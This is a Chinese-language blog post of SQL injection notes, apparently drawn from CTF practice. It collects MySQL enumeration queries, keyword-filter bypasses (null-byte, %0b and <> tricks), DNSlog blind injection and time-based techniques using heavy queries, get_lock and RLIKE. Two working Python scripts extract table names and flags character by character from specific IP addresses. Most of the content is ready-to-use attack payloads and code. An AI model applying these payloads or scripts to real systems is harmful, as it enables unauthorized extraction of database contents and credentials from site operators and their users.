---
title: sql注入大全
date: 2018-03-21 09:26:16
tags: 
- 安全
- sql注入
categories: 
- 安全
- sql注入
---
- 表名

  ```mysql
  select group_concat(distinct table_name) from information_schema.tables where table_schema=database()
  ```


- 列名

  ```mysql
  select group_concat(distinct column_name) from information_schema.columns where table_name=[16进制|`table_name`]
  ```


- 数据库

  ```mysql
  select group_concat(schema_name) from information_schema.schemata
  ```

- 表内容

  ```mysql
  select 1,concat(user, 0x2c, password) from [table_name]
  ```

  ​
```
优先级 运算符
(最高)  !
    -（负号）,~（按位取反）
    ^（按位异或）
    *,/(DIV),%(MOD)
    +,-
    >>,<<
    &
    |
    =(比较运算),<=>,<,<=,>,>=,!=,<>,IN,IS NULL,LIKE,REGEXP
   BETWEEN AND,CASE,WHEN,THEN,ELSE
   NOT
   &&,AND
   XOR
   ||,OR
(最低)    =(赋值运算),:=
```

# union select 不允许同时出现
过滤正则表达式如下:
<code>	
union[\s\xA0]+select
</code><br/>
可以使用union all select绕过

# select过滤
se%00lect绕过

# -- 注释
--后边不允许添加任何空白字符
过滤正则表达式如下:
--[\s\xA0]
还可以使用%1a
--%1a绕过

# where后边跟着sleep函数
`
select * from table_name where sleep(2) or 1 = 2;
`

如果1=2，则会等待（2*该表中的记录数）秒，没有数据返回
如果1=1，则会立即返回所有数据

@`'` 相当于 NULL

select group_concat(ip)'' from client_ip;

# DNSlog盲注
DNSlog盲注需要用的load_file()函数，所以一般得是root权限。show variables like '%secure%';查看load_file()可以读取的磁盘。

1、当secure_file_priv为空，就可以读取磁盘的目录。

2、当secure_file_priv为G:\，就可以读取G盘的文件。

3、当secure_file_priv为null，load_file就不能加载文件。


sleep 不能填数字，可以使用pi()替代

各种payload:
```
select * from antisqli where `id`='\' and `pw`=md5(' union select 1,2,3--')
```

```
644400 union select 'z1',flag,'z3','z4' from flag order by password desc#
```

关键词union,select,from被过滤，可以考虑%00绕过

```
//过滤sql
$array = array('table','union','and','or','load_file','create','delete','select','update','sleep','alter','drop','truncate','from','max','min','order','limit');
foreach ($array as $value)
{
	if (substr_count($id, $value) > 0)
	{
		exit('包含敏感关键字！'.$value);
	}
}

//xss过滤
$id = strip_tags($id);

$query = "SELECT * FROM temp WHERE id={$id} LIMIT 1";
payload:
http://103.238.227.13:10087/?id=2 unio%00n se%00lect hash,2 fro%00m sql3.key#
由于strip_tags 将<>替换为空，所以可以使用<>绕过：
http://103.238.227.13:10087/?id=2 unio<>n se<>lect hash,2 fro%00m sql3.key#
```

某些情况下SQL关键词被过滤掉并且被替换成空格。因此我们用“%0b”来绕过。
id=1+uni%0bon+se%0blect+1,2,3--

# Mysql大小写不敏感，绕过检测

# heavy query       

[链接](http://www.360zhijia.com/anquan/369098.html)

## 笛卡尔积运算

> select * from content where id = 1 and 1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C);

```python
import requests

url = "http://52.80.179.198:8080/article.php?id=1' and %s and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)%%23"
data = ""
for i in range(1,1000):
    for j in range(33,127):
        #payload = "(ascii(substr((database()),%s,1))=%s)"%(i,j) #post
        #payload = "(ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s)" % (i, j) #article,flags
        #payload = "(ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='flags'),%s,1))=%s)" % (i, j) #flag
        payload = "(ascii(substr((select flag from flags limit 1),%s,1))=%s)" % (i, j)
        payload_url = url%(payload)
        try:
            r = requests.get(url=payload_url,timeout=8)
        except:
            data +=chr(j)
            print data
            break
```



##  Get_lock

get_lock是mysql的锁机制

* get_lock会按照key来加锁，别的客户端再以同样的key加锁时就加不了了，处于等待状态。
* 当调用release_lock来释放上面的锁或者客户端断线，上面的锁才释放，其他的客户端才能进来

打开两个cmd

cmd1:

```
mysql> select get_lock('skysec.top',1);
+--------------------------+
| get_lock('skysec.top',1) |
+--------------------------+
|                        1 |
+--------------------------+
1 row in set (0.00 sec)
```

cmd2:

```
mysql> select get_lock('skysec.top',5);
+--------------------------+
| get_lock('skysec.top',5) |
+--------------------------+
|                        0 |
+--------------------------+
1 row in set (5.00 sec)
```

cmd1:

```
mysql> select get_lock('skysec.top',2);
+--------------------------+
| get_lock('skysec.top',2) |
+--------------------------+
|                        0 |
+--------------------------+
1 row in set (2.00 sec)
```

关闭cmd1,cmd2执行：

```
mysql> select get_lock('skysec.top',5);
+--------------------------+
| get_lock('skysec.top',5) |
+--------------------------+
|                        1 |
+--------------------------+
1 row in set (0.00 sec)
```

cmd1关闭之后，锁自动释放，方案不是最佳，原因，该方法需要前提，长连接一般在php版本系列中，我们建立与Mysql的连接使用的是`mysql_connect`。

```
mysql_connect() 脚本一结束，到服务器的连接就被关闭
mysql_pconnect() 打开一个到 MySQL 服务器的持久连接
```

官方描述：

```
mysql_pconnect() 和 mysql_connect() 非常相似，但有两个主要区别。
首先，当连接的时候本函数将先尝试寻找一个在同一个主机上用同样的用户名和密码已经打开的（持久）连接，如果找到，则返回此连接标识而不打开新连接。
其次，当脚本执行完毕后到 SQL 服务器的连接不会被关闭，此连接将保持打开以备以后使用（mysql_close() 不会关闭由 mysql_pconnect() 建立的连接）。
简单来说，即
mysql_connect()使用后立刻就会断开
而
mysql_pconnect()会保持连接，并不会立刻断开
```

所以:

我们的时间盲注必须基于我们请求加锁的资源已经被其他客户端加锁过了 而mysql_connect()一结束，就会立刻关闭连接 这就意味着，我们刚刚对资源`skysec.top`加完锁就立刻断开了 而get_lock一旦断开连接，就会立刻释放资源 那么也就破坏了我们的前提：我们请求加锁的key已经被其他客户端加锁过了 所以如果使用了`mysql_connect()`，那么get_lock的方法将不适用 而`mysql_pconnect()`建立的却是长连接，我们的锁可以在一段有效的时间中一直加持在特定资源上 从而使我们可以满足大前提，而导致新的time injection手法 当然这里还有一个注意点 即第一次加锁后，需要等待1~2分钟，再访问的时候服务器就会判断你为客户B，而非之前加锁的客户A 此时即可触发get_lock 同样我们也本地测试一下，还是之前的cmd1和cmd2

 cmd1:

```
mysql> select * from content where id = 1 and get_lock('skysec.top',1);
+----+-------------------------------------+
| id | content                             |
+----+-------------------------------------+
|  1 | I think you may need sql injection! |
+----+-------------------------------------+
1 row in set (0.00 sec)
```

cmd2:

```
mysql> select * from content where id =1 and 1 and get_lock('skysec.top',5);
Empty set (5.00 sec)

mysql> select * from content where id =1 and 0 and get_lock('skysec.top',5);
Empty set (0.00 sec)
```

脚本如下:

```python
# -*- coding: utf-8 -*-
import requests
import time
url1 = "http://52.80.179.198:8080/article.php?id=1' and get_lock('skysec.top',1)%23"
r = requests.get(url=url1)
time.sleep(90)
# 加锁后变换身份
url2 = "http://52.80.179.198:8080/article.php?id=1' and %s and get_lock('skysec.top',5)%%23"
data = ""
for i in range(1,1000):
    print i
    for j in range(33,127):
        #payload = "(ascii(substr((database()),%s,1))=%s)"%(i,j) #post
        payload = "(ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s)" % (i, j) #article,flags
        #payload = "(ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='flags'),%s,1))=%s)" % (i, j) #flag
        #payload = "(ascii(substr((select flag from flags limit 1),%s,1))=%s)" % (i, j)
        payload_url = url2%(payload)
        try:
            s = requests.get(url=payload_url,timeout=4.5)
        except:
            data +=chr(j)
            print data
            break
```

总结:

必须使用长连接，即使用mysql_pconnect()

构造被加锁的数据

1.以客户A的身份,对资源skysec.top进行加锁 

2.等待90s，让服务器将我们下一次的查询当做客户B 

3.利用客户B去尝试对资源skysec.top进行加锁，由于资源已被加锁，导致延时 

## Rlike

正则表达式

```
concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b'
```

以上代码等同于sleep(5)

 ```
mysql> select * from content where id =1 and IF(1,concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',0) and '1'='1';
Empty set (4.24 sec)

mysql> select * from content where id =1 and IF(0,concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',0) and '1'='1';
Empty set (0.00 sec)
 ```

## sleep

```
mysql> select sleep(5);
+----------+
| sleep(5) |
+----------+
|        0 |
+----------+
1 row in set (5.00 sec)
```

BENCHMARK

```
mysql> select benchmark(10000000,sha(1));
+----------------------------+
| benchmark(10000000,sha(1)) |
+----------------------------+
|                          0 |
+----------------------------+
1 row in set (2.79 sec)
```







